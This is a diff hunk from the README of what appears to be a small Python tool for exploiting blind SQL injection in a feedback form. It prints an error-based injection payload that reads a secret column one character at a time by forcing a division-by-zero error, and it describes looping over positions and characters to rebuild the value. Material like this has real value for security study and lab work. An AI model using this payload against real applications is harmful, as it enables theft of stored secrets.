@@ -9,7 +9,7 @@ A small Python tool to exploit blind SQL injection in a feedback-style form that
     '||(SELECT CASE\
            WHEN substr(secret,POS,1)='C' THEN ''\
            ELSE (SELECT 1/0) END\
-         FROM secret_table)||'\
+         FROM secret_table)||'
  - The script loops over positions (POS = 1..N) and a character set until it reconstructs the value.
 # Requirements
  -  Python 3.8+
